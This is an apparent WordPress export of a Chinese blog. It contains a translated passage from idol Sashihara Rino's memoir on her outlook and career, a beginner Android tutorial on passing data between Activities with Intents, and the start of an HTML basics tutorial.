虽然我是对物品没有任何情节的一类人，但是这张画像却是我最重要的宝物。
还有作为嘉宾出演一个音乐节目的时候有件感动的事情（《魁！音楽番付~Eight~》2012年5月3日放送）。我得到了一个共演的机会，是和我在大分作早安宅的时候就非常喜欢，加入AKB48之后继续表达自己喜欢喜欢的Berryz工房的熊井酱（熊井友理奈）一起出演哦。
只是这样就已经很开心了，更惊喜的是熊井酱还带来了我住在大分还是中学生的时候递给她的粉丝卡片。
过去的自己把 [喜欢！] 化做言语，把心情传递给熊井酱。现在将 [喜欢] 继续表达，得以在节目中相见。
我想我真是什么都去试着表达呢。不对，关于 [喜欢] 无论什么说出来就是胜利。
自我陶醉
我感觉自己幸福的原因，也有自己是自我陶醉类型的成分。
去年，我制作了かおたん（松村香织，SKE48终身名誉研究生）的个人演出。
因为制作偶像歌曲是我一直向往的，曲子是在30首左右的候补中亲自筛选，歌词也是我亲自创作。最初决定[マツムラブ」作为关键词，以这5个文字为副歌的最初与最终找到中意的曲子之后，在手机上一鼓作气书写完成。因为是在福冈到东京的飞机上，我想创作时间用了大约一个小时。
后来得知，秋元先生好像也使用同样的创作方式。秋元先生说他同样决定单语之后，选择中意的曲子。
就这样歌曲制作完成，《マツムラブ！》。现在重新聆听，自卖自夸的说歌曲超赞，特别是歌词，歌词。
虽然对外表对人性都没自信，但对自己的人生却拥有十分的信心。
我感觉自己的人生最优越，最幸福。关于人生，我有自信不会输给任何人。
所以无论被作为怎样的坏角色，被说难以入耳的坏话，我的人生都是最棒的，我想我没有问题。
被表扬之后马上调整情绪
自己表扬自己当然没有问题，果然被别人表扬之后更加开心。
我想我并不是没有主见的人哦。我有好好保持自己的意见。但是，如果在自己并不是这样想的地方得到称赞，也会很快认同。
深层次的看自己，我感觉自己善于转换态度呐，有一件印象深刻的事情。
总选举选拔组的歌曲，往往会照应获得第一名成员的形象。举个简单的例子，（大岛）优子酱获得第一名的时候，诞生了《ヘビーローデーション》这首元气满满的歌曲。
我同样在2013年获得了第一位。秋元先生会为我创作一首怎样的歌曲呢。我曾经感觉危险哦。因为有过这样的预告 [因为指原是个奇怪的家伙，那就写一首纳凉大会主题曲] 。
最后完成的是名叫《恋するフォーチュンクッキー》的歌曲。
说实话可以吗？
最初我听到这首曲子的时候，超讨厌呢。曲调很慢，没有一点疾驰感。完全不认为是首好歌曲！
关于偶像歌曲我希望的东西是疾驰感哟。我将我的想法传达给秋元先生之后，得到了这样的回答 [就你喜欢的那种歌曲闭上眼都写的出]。
如果这样的话你闭上眼写就好了嘛......
实际歌曲被发型之后，获得了超好的评价。タモリ先生也说 [第一次听的瞬间，就感觉这是首超赞的歌曲]，
（千原）ジュ二ア先生，渡边直美小姐也对我说 [已经买了哟！]。能够被周围人如此称赞的歌曲，至今还没有哦。就在这种实实在在的感觉一点一点出现的时候，我感受到这首歌曲已没有过的形式，在这个世界中广为人知。
结果我的心境也一下子发生了改变。
[这首歌曲，不是超赞吗！]
态度转换真的很快呢。如果周围人都说这是一首好歌，我也真心的去相信这是一首神曲。
也许对于坏的意见我不会改变。别的人都说这是首烂歌，但自己认为是好歌它就是好歌。这方面我也许不会随波逐流。
但是，好不容易得到周围的赞许，追随大家的意见更好，如果被认作是顽固的家伙，那不是会惨不忍睹么。
能与周围的意见和谐统一最好，我想会感到幸福。
只能听到表扬的话语
总之，我想被称赞，是伴随称赞进步的类型。
当然，有被工作人员提醒的时候，也有被秋元先生严肃教导的时候。
但是，我只能听到表扬我的话语。糟糕的女孩呢。
被警告的时候不是也会夹杂着表扬的话语吗。
[这个，这个地方做的不错，但是......] 我的耳朵只能听到 [但是] 之前的话语。
[这个，这个地方做的不太好。但是，也有做的好的地方]。
我的耳朵只能听到 [但是] 之后的话语。
占卜同样，我只相信好的事情。
[从这个这个感觉来看，现在运气不好。但是.......] 我只在意但是之后的事情。
穿过消极。
大前提 [不要给别人添麻烦] 怎么说，感觉没救了呢？
但是，我是不愿意给别人添麻烦的类型哦。也许大家会想，因为丑闻的事情你给多少人填过麻烦，你别说这个........
请稍稍听我说。
比如，因为睡懒觉导致化妆的时间只有10分钟，这完全没有问题，但如果是因为自己睡懒觉而耽误了别人的时间这就可怕了。
第一次主演电视剧《ミューズの鏡》的时候同样，因为讨厌怪自己忘记台词而给其他演员以及工作人员造成困扰，所以决心好好的记住自己的台词。因为不想给别人造成麻烦，所以遵守法律。
就算去附近的便利店同样，好好的按下步行者红绿灯的按钮耐心等待。就算是深夜道路空空，就算一辆车都看不到的时候，也绝不会在红灯的时候渡过马路。
同样讨厌在红绿灯闪烁的时候跑过马路。别人看到你抢过马路会忐忑不安，会给别人带来麻烦。
我想我是很具备常识的。虽然破坏了禁止恋爱的规则，但这之外的所有规则我都好好遵守。
我想人生只有一次，做任何事情都能理解。但是不能给别人带来麻烦！这也许是我思考的大前提。
确信能够为了自己
结果，我想我只考虑我自己。
只为自己而活。只做能为自己获得成绩的事情。
大概在公司也如此吧。
努力的工作，如果可以得到周围人的赞许 [这次多亏了你] 那么去做没有问题，对于不至于如此的工作不会特意举手去做。
如果这样思考，那么HKT48也是同样。为了组合拼命去工作，因为能够得到一句 [指原做的好] 就好开心。
不如说是因为想要得到赞许的话语，才可能产生想要努力的感觉。
真是肮脏的性格啊。
令人悲伤。
最开心的的是能让他人开心
到这里把扭曲的性格放到一边，自己最开心的事是可以让别人开心。如果自己能够做些什么获得别人的笑容，那么对于我自己也是最开心的事情。
所以，我特别喜欢送礼物给他人。很久以前开始，就很少在自己身上花钱哦。喜欢把钱用在别人身上，自己情绪也会高涨。与后辈一起的时候我会经常请客。
最早请我的前辈是（大岛）优子酱。Not yet（大岛优子，北原里英，衡山由依，指原的衍生组合）4个人去KTV的时候，[我来出] 理所当然一般帮我们3个人埋单。她说 [让后辈出钱的话反而会难为情的哦]。
那时我想，啊，是这样啊。话说有钱的人必须把钱投资出去呐。
たかみなさん（高橋みなみ）同样，一起吃饭的时候她一定会请我。[完全没关系哦]。
现在，我也试着模仿她们这样做。
麻里子大人（篠田麻里子）请我去做小颜按摩的时候同样感动，[真的有这么好的人吗？！]。因为小颜按摩的价格非常的贵哦。我也想成为这样的人。
我想这样做源自于很单纯的想法哦。自己感受到开心的事情，想要赠与别人。只是这样。
事实上，现在自己通过工作可以好好到赚钱了，渐渐也可以代替后辈埋单。我明白看到别人开心的样子，自己心情也会非常愉悦。很久以前开始喜欢送礼物的感觉，现在渐渐可以做到更好的实行。
记得感恩哦。当然仇也不会忘记。两者都带着非常深刻执着的态度。
我，究竟是一个怎样的女孩子呢。
谜团只是更深了呢？
如果不去战斗就没有失败
最后，传授我珍藏的秘密。只教给真正在路口迷茫的孩子，这是人生的精髓。
我基本上不会针锋相对一决胜负。
到这里说到过很多次了，总是改变战场哟。探寻避免战斗的解决方法，创造可以战斗的主场。
话说我也许不太在意胜利或是失败。在意了会想到失败的人生。不去在意的话则是胜利。是这样吧？
这样思考之后，我人生中唯一与他人针锋相对绝胜负的也许只有总选举。啊，在网络上争论的情况另当别论哦。像那种情况，我绝对不想输。
回到刚刚的话题。
第一次总选举（2009年7月8日开票）的故事。
当时前21名可以进入选拔组。虽然我并没抱有特别高的期望，但绝对希望进入选拔组。
结果1170票，27位。
演讲的时候开始大哭，直到后台，2个小时一直在哭泣。
现在回过头来看，同样是人生中最不甘心的事情。今年总选举获得2位的遗憾也比不上这个时候的不甘。我想 [这之后我永远也进入不了选拔组了] 。因为是第一次尝试举办总选举，这对我有怎样的影响完全不知。事实上，在挤入下一年的总选举选拔组为止，我没能进入选拔。
所以。
曾经自暴自弃。
如果是现在的我，我想可以在心情被拖累的一瞬间进行调整。但那个时候还远远不行。超消极。有一个什么机会，我想我很有可能会从AKB48辞职。
所以在那之后，比如转化没能进入选拔组的遗憾情感，在这一年好好努力......这种想法完全没有。以这次遗憾为契机，我决心改变自己的角色向更综艺的方面努力。结果第二年名次得到跳跃......像这些故事也全部消失。
在说一次。
曾经自暴自弃。
不是有句话这样说 [把遗憾变为反弹的能量] 。我，没办法将不甘化作力量。
我是如果有不甘心的事情，说句 [切，最糟糕了] 而后随之消沉的类型。
这是很久之前就明白的事情。在学校的考试同样，[这次没有考好，下次好好努力] 这样的想法一次也没有过。
取而代之的是失落 [什么啊，自己这是什么啊]。
正是因为明白自己是这样的人，感觉到 [不甘心] 的事情，必须要马上去忘记。去调整心态，必须把 [不甘心] 的情感化作乌有。
第一回总选举的时候，还远远不能够做到。也没能注意到。但现在已经完全没有问题。[不甘心] 什么的，一觉醒来已经忘的干干净净。
但是还有更好的方法。那就是最初就不要去战斗。如果不参加战斗就没有失败。对于我来说重要的不是赢，而是不能输。
没有竞争对手
我想也许我原本就欠缺与别人竞争的心态。
一直以来没有竞争对手。我从未想过自己与对方相比劣势在哪里想要追赶，从未想过设定一个竞争对手会使自己成长。从未想过看看周围 [有一个竞争对手会更好呢]。
清楚的意识到这些事情，有一件印象深刻的变故。
我来到东京之后，有一起生活一个月被称作 [地方组] 的朋友。
成员有来自爱知县的北原里英，中西优香，来自福冈县的大家志津香，还有现在已经毕业的女孩子。同龄的5个女孩子一起生活。
早上早早起床去训练场，记忆舞蹈动作，练习发声训练，晚归之后继续自习，大家玩闹之后疲倦入眠。白天在训练场多得的便当晚上大家一起作为晚饭。家与训练场单调的往复，每天的24小时亦是如此。
只有这个孩子会更早，只有这个孩子会去别的小组练习，当时还没有类似所谓的竞争。我想正是这样，5 个人之间的关系能那样的好。
大家都不是东京出身，我想这也是很大的原因。宣称 [要成为偶像] 而来到这个大都市，在家乡不是也会成为话题吗。在话题流传之间，不能得到认可也就不能回到家乡。也对不起支持自己梦想，经济援助自己的父母。所以，虽然不是要 [衣锦还乡]，但我能够明确既然来了就必须要努力。大家都怀抱同样的心情。
突然能够找到想要在一起的重要朋友，我感觉真的很幸运。
但我的这种心情，在那儿终止了。
这是地方组开始自个生活，稍后发生的故事。
同期的北原（里英）开始出演电视节目。这之后，地方组的其他成员边哭着打电话说 [北原开始接手工作，而自己什么事情也没有.....] 。
那个时候，才第一次主要到哦。[啊，人是抱有这样一种情感啊]。
我也和那个孩子有着完全相同的状况哦，但是我对北原只有 [祝贺] 的心情。完全没有感觉到 [我输给了她] 。
也许把我作为竞争对手的成员有很多很多。但是，我对任何人都不会这样想。并不是不把对方放在眼里，而是在我的体内从未有过竞争的心。
不擅长面对[同龄人]
继续现在的话题，再说一点点。
我对前辈软弱，对后辈温柔。对于年龄大的人放低自己没有错误，对年龄小的孩子多少抬高姿态也完全OK。
这样思考之后，对于我最难以去交流的也许是同龄人。怎样的姿态面对才是正确的，太过没有基准。
比如咪酱（峯岸みなみ）与我同岁，生日也只相差6天，如果是同期生的话我也不知道能不能成为朋友。咪酱是AKB48的初代成员，因为是前辈，自然的 [前辈！] 印象纳入心中，能够成为像今天一样的好朋友。
如果不是这样的话，会如何呢。
回望至今的经历，我与有着某种上下级关系的人，不可思议感觉更容易成为朋友。
如果是同龄人，也许容易抱有一颗类似竞争的心。就算我没有这种心态，对方也许会这样想。
但是我对任何人，[赢] 还是 [输] 我都不想去思考。不去做与人胜负相争心情跌宕起伏的事情。自己就是自己，永远一颗寻常心。
不决定目标
总之我不想去战斗。
不想去与别人战斗，同样也不想与自己战斗。
所以我不给自己制定目标。
决定了目标，就要为之奋斗。
如果没能完成目标，不是会想 [原来自己只能到这儿啊]。会认为自己 [输] 给了自己。
如果没有目标，会认为 [幸运，竟然可以走到这里]。
比起向上看，绝对不如把目光放在一步一步的累积。这样不是可以快乐的生活吗。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>870</wp:post_id>
		<wp:post_date><![CDATA[2016-02-03 23:36:35]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-03 15:36:35]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e3%80%8c%e9%80%86%e8%bd%ac%e5%8a%9b%e3%80%8d-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83%e8%91%97-%e7%ac%ac%e5%85%ab%e7%ab%a0]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="akb"><![CDATA[akb]]></category>
		<category domain="post_tag" nicename="akb48"><![CDATA[akb48]]></category>
		<category domain="post_tag" nicename="akb48g"><![CDATA[akb48g]]></category>
		<category domain="post_tag" nicename="akb48group"><![CDATA[akb48group]]></category>
		<category domain="post_tag" nicename="akbg"><![CDATA[akbg]]></category>
		<category domain="post_tag" nicename="hkt48"><![CDATA[HKT48]]></category>
		<category domain="category" nicename="%e4%b9%a6%e7%b1%8d"><![CDATA[书籍]]></category>
		<category domain="post_tag" nicename="%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83"><![CDATA[指原莉乃]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e9%80%86%e8%bd%ac%e5%8a%9b"><![CDATA[逆转力]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[314]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>「逆转力」– 指原莉乃著 – 第九章(最终章)</title>
		<link>https://www.nervgeek.com/2016/02/03/%e3%80%8c%e9%80%86%e8%bd%ac%e5%8a%9b%e3%80%8d-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83%e8%91%97-%e7%ac%ac%e4%b9%9d%e7%ab%a0/</link>
		<pubDate>Wed, 03 Feb 2016 15:37:42 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=872</guid>
		<description></description>
		<content:encoded><![CDATA[<strong><span style="font-size: 24pt;">第九章    用逆转力快乐的生活</span></strong>
&nbsp;
经过移籍HKT48的事情，我想我变得更加积极。内心更加强大。我感觉到在自己的心中完成了<strong> [危机=机遇]</strong> 的思考方式，换而言之<strong> [逆转力的思考]</strong> 。
从自己的策划术，交流方法，到工作方式思考一路说来，从新体会到一些事情。
想再一次，说一说那个时候的故事。
转换心态，破涕为笑
作为偶像，缺点的方面更多哦。
歌唱的不好，舞跳的不好，颜也不可爱。
这样说这后，也许大家会认为<strong> [没这回事的哦，想要得到这样的回应？]</strong> ，其实真心是这样看自己的，我有自知之明。因为我只善于客观看待事物。<!--more-->
而且，那个丑闻出现之后，说实话，我感觉我的偶像生命也许已经终结。第四章的时候也提到过的，真心感觉由AKB48辞职会更好。但是，移籍至HKT48，得到了为使组合繁荣的又一次机遇，从这之后清楚的看到了未来的道路。所以一觉醒来已经元气满满。第二天像往常一样，我找回了我自己。
记事刊登的事情已是无可奈何。自己对于无可奈何的事情也无能为力。
与其去思考，不如忘记更好。之后只要做好自己该做的事情就好。
与往常一样快乐的生活，完成眼前的工作。
决定移籍HKT48的第二天，有综艺节目收录。是与同一个事务所的土田（晃之）先生，（剧团）ひとり先生一起做节目，移籍的事情被大肆取笑了。
如果在这感到悲伤，好似被触碰到了肿起的地方，我意识到这之后也许都不会顺利了。被取笑的时候，<strong>[请等一等哦！]</strong> 用这种回答方式，我也主动上前，就不会变成看着就痛苦的感情哦，反而会变得好笑，会成为桥段不是吗。
这之后同样，在各种各样的综艺节目中被共演者的大家好好欺负了一番。
<strong>[为什么移籍到了HKT了呢？] [照片被出售了！] [什么样的男人是你的菜？] [嘴严的人！]</strong> 被抛来这些桥段之后，不断的乘势前进。
如果能保持有趣的方向，我想没有问题。如果变成<strong> [这家伙，真糟糕]</strong> 的氛围，我想这不可以。
所以，如果好笑就安全了。
把被取笑化作笑容。这多亏了周围的大家，帮助我将自己<strong> [悲伤] [可怜]</strong> 的印象，逆转为开朗的气氛。
<strong>逆转力是被应援的力量</strong>
预想之外幸运的事情发生了。
我转换心态之后，对过去的事不是满不在乎了吗。但是，周围人还会想<strong> [可怜啊] [肯定很难过吧]</strong> 。
我与周围的人在心情上存在着隔阂。这些隔阂正是机遇哦。
身处危机之时展现乐观积极的努力姿态，则会获得周围的好评。在大家都担心<strong> [没关系吗？]</strong> 的时候，展现元气满满的姿态，会获得<strong> [真强呢]</strong> 这样的好评。把危机作梗化为欢笑，则会得到<strong> [好厉害啊]</strong> 的鼓励。
身处危机的时候，别人评价你的标准就会降低哦。得到这些的我有点狡猾。
我想会有人生我的气哦，会有人讨厌我。但是，那时感受最深的是大家给我加油的心情。
也许我什么都没有做，把我从最坏的泥潭拉出获得现在的成就，是靠着大家的应援。
如果说现在的偶像必要的东西是<strong> [被应援的力量] </strong>，我也许也拥有这种力量。
危机转变为机遇，我<strong> [逆转力]</strong> 的源泉，是来自大家的应援。
快乐的生活！
在2012年的新春之际，在剧场首次宣布书写当年的抱负。
我选择的一句话是，<strong>[快乐的生活]</strong> 。在那之后，从未改变。
就算有什么心酸的事情发生，一点也可以，朝着快乐的方面思考。
深信着快乐，快乐，快乐。只有这样去做。就算只有一瞬间认为<strong> [也许完了]</strong> ，那真的完了。危机的时候同样，只有用强烈的心情去深信<strong> [危机更是机遇] </strong>。
总结自己心中的结论，<strong>[可是，我很快乐]</strong> 转换心态也可以作为一个手段。
比如在综艺节目的收录中，有时会感到自己没能够好好的表达，自己什么都做不了。如果被这种心情牵引，情绪降低，也许对接下来的工作都会产生障碍。所以，[但是，我很快乐] 马上转换为这个结论就好了。
没能流畅的表达，<strong>[但是，我很快乐]</strong> 。
不能够为这个节目做出些什么，<strong>[但是，我很快乐]</strong> 。
这也是逆转力吧？
结论是，能够给自己幸福的，我想正是自己。
自己创造幸福，强烈的强烈的怀抱这种心态，我想这是通往幸福最近的道路。
<strong>写在最后</strong>
在这个夏天，我移籍到HKT48渡过了整整2年。
在AKB48的时候我很开心。但是毫无疑问，现在是我最快乐的时光。
我想如果我没能移籍到HKT48，我的偶像生涯会更短暂。
HKT48的成员大家都很纯净，好的意义上说不能够把事情做得很好。拥有无限的潜力。在她们旁边看着她们的成长，自己也得到了进步。而且，憧憬偶像而加入AKB48，能够回忆起过去的自己。
不可思议的事情出现了。
无论剧场公演还是演唱会，相比以前更清晰的听到了来自粉丝的应援声。
来自观众席的应援声，只有在舞台上才能品味到的情感，可以说如同中毒一般。这段言语的意味，我感觉最近终于能够明白了。
这本书中说过很多遍的故事，我在大分的时候，是如果有喜欢偶像的演唱会就会去现场的<strong> [现场宅]</strong> 。
成为HKT48成员的今日，我最沉醉于现场。
那个时候陪我一起去偶像演唱会的妈妈，最近好似也爱上HKT48的演唱会，每场都会来看。
母女俩齐聚现场，现在我同样是<strong> [现场宅]</strong> 。
稍微说点好消息可以吗？
今年年初，HKT48九州巡演，第一次在我的家乡大分举办了凯旋演唱会。
会场是我小学5年纪的时候，第一次观看偶像演唱会的会场。
在那里我见到了あやや（松浦亚弥），早安少女，后藤真希，现在我站在了同一个舞台上。
<strong>[在舞台上看到的风景是这样啊]</strong>
[那场演唱会的时候，我就坐在那边呐] 各种各样的记忆涌上心头。
那场演唱会是ミキティ小姐（藤本美贵）还在早安少女的时候。在ミキティ准确的看向坐在2层的我之时，在我向她挥手的瞬间，她也向我挥了手。
后来把这件事情告诉别人，被当做傻瓜了哦。
被说是<strong> [自作多情] </strong>。在被这样说的时候，我想也许我确实是
<strong>[自作多情]</strong> 。
现在自己登上同样的舞台，我明白了。我清清楚楚的可以看到坐在我那个位置上观众的挥手。果然，ミキティ是在回应我的挥手呢！这件事情得到确认，真的超级开心。
好像自己能够对憧憬偶像的过去的我在挥手。
有一天我也会毕业。有一天不再是偶像。
如果毕业之后继续从事艺能活动，我也完全不会讨厌被称作是<strong> [元AKB48] [元HKT48]</strong> 。与其说更想怀抱过去的荣光生活下去。但是，现在还完全没有考虑过毕业的事情。想永远将偶像继续下去，想继续站在舞台之上。
话说。
我的思考方式，果然是奇怪的吗？
乍一看是个普通的女孩子呐？试着听我讲一些关于我思想的话语，只会感到奇怪吧。只是性格恶劣，心计高深。
稍微有些糟糕呢。感情在不知道在哪哪脱落了哦。但是常识还是有的。意外的积极向上。什么和什么呢，我。
会有人娶我吗？]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>872</wp:post_id>
		<wp:post_date><![CDATA[2016-02-03 23:37:42]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-03 15:37:42]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e3%80%8c%e9%80%86%e8%bd%ac%e5%8a%9b%e3%80%8d-%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83%e8%91%97-%e7%ac%ac%e4%b9%9d%e7%ab%a0]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="akb"><![CDATA[akb]]></category>
		<category domain="post_tag" nicename="akb48"><![CDATA[akb48]]></category>
		<category domain="post_tag" nicename="akb48g"><![CDATA[akb48g]]></category>
		<category domain="post_tag" nicename="akb48group"><![CDATA[akb48group]]></category>
		<category domain="post_tag" nicename="akbg"><![CDATA[akbg]]></category>
		<category domain="post_tag" nicename="hkt48"><![CDATA[HKT48]]></category>
		<category domain="category" nicename="%e4%b9%a6%e7%b1%8d"><![CDATA[书籍]]></category>
		<category domain="post_tag" nicename="%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83"><![CDATA[指原莉乃]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e9%80%86%e8%bd%ac%e5%8a%9b"><![CDATA[逆转力]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[320]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Android中的在不同Activity中传递参数</title>
		<link>https://www.nervgeek.com/2016/02/12/android%e4%b8%ad%e7%9a%84%e5%9c%a8%e4%b8%8d%e5%90%8cactivity%e4%b8%ad%e4%bc%a0%e9%80%92%e5%8f%82%e6%95%b0/</link>
		<pubDate>Fri, 12 Feb 2016 12:53:20 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=882</guid>
		<description></description>
		<content:encoded><![CDATA[日常跳转Activity的时候，新的Activity经常会用到上一个Activity的数据，在安卓中可以使用Intent提供的方法传递各种参数。
&nbsp;
在MainActivity添加一个按钮，id为SendIntent2AnthorActivity。
这次我们传递一个自增的数字给另一个Activity，先在<code>MainActivity</code>类里新建一个全局的int

<pre>private int a = 0;</pre>

然后在MainActivity的<code>onCreate</code>里添加下面代码

<pre>findViewById(R.id.SendIntent2AnthorActivity).setOnClickListener(new View.OnClickListener() {
    public void onClick(View v) {
        a++;
        //a自增
        Intent i = new Intent(MainActivity.this,AnthorActivity.class);
        i.putExtra("data",String.valueOf(a));
        //Intent的putExtra方法可以传递不同数据，第一个参数“data”是这个数据的名称，第二个参数是数据的本体，这里把int类型转换成String类型
        startActivity(i);
    }
});</pre>

<!--more-->
&nbsp;
在AnthorActivity添加一个TextView，id为ShowValue。
在AnthorActivity的<code>onCreate</code>里添加下面代码

<pre>ShowValue= (TextView)findViewById(R.id.ShowValue);
Intent i = getIntent();
String str = i.getStringExtra("data");
ShowValue.setText(str);</pre>

&nbsp;
编译程序，运行界面如下
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/UQN9KOAU1Y0JRAB74.png" rel="attachment wp-att-883"><img class="alignnone wp-image-883" src="https://www.nervgeek.com/wp-content/uploads/2016/02/UQN9KOAU1Y0JRAB74.png" alt="UQN($9K[OAU)1Y$0JR%AB74" width="375" height="673" /></a>
点击按钮，跳转到另一个Activity
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/RT@5AKTDR@G4WL9SWKU.png" rel="attachment wp-att-885"><img class="alignnone wp-image-885" src="https://www.nervgeek.com/wp-content/uploads/2016/02/RT@5AKTDR@G4WL9SWKU.png" alt="}RT@5AKTDR@G4WL%9S))WKU" width="374" height="671" /></a>
按退出，返回MainActivity，再点击跳转按钮，数字自增
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/SRH349LLVPX5PG3_9X@U.png" rel="attachment wp-att-886"><img class="alignnone wp-image-886" src="https://www.nervgeek.com/wp-content/uploads/2016/02/SRH349LLVPX5PG3_9X@U.png" alt="SRH349LLVPX5]PG)3_9X@&#96;U" width="374" height="670" /></a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>882</wp:post_id>
		<wp:post_date><![CDATA[2016-02-12 20:53:20]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-12 12:53:20]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[android%e4%b8%ad%e7%9a%84%e5%9c%a8%e4%b8%8d%e5%90%8cactivity%e4%b8%ad%e4%bc%a0%e9%80%92%e5%8f%82%e6%95%b0]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="activity"><![CDATA[activity]]></category>
		<category domain="post_tag" nicename="android"><![CDATA[android]]></category>
		<category domain="post_tag" nicename="intent"><![CDATA[intent]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="%e5%ae%89%e5%8d%93"><![CDATA[安卓]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[197]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>30分钟上手Html</title>
		<link>https://www.nervgeek.com/2016/02/12/30%e5%88%86%e9%92%9f%e4%b8%8a%e6%89%8bhtml/</link>
		<pubDate>Fri, 12 Feb 2016 13:17:41 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=890</guid>
		<description></description>
		<content:encoded><![CDATA[<strong><span style="font-size: 36pt;">HTML</span></strong>
<strong><span style="font-size: 18pt;">html的基本结构</span></strong>
不管html文件复杂程度大小，它的基本结构式都是：
<strong>&lt;元素 属性=“属性值”……&gt; 内容 &lt;/元素&gt;</strong>
如果没有内容，可以这样写：
<strong>&lt;元素 属性=“属性值”…… /&gt;</strong>
或者
<strong>&lt;元素 属性=“属性值”……&gt; &lt;/元素&gt;</strong>
（推荐使用前面的方法）<!--more-->
重点：
1、一个元素可以有多个属性。
2、元素又叫标记。
3、&lt;元素&gt;……&lt;/元素&gt;和&lt;元素 /&gt;效果一样。

<pre>示例：
&lt;html&gt;
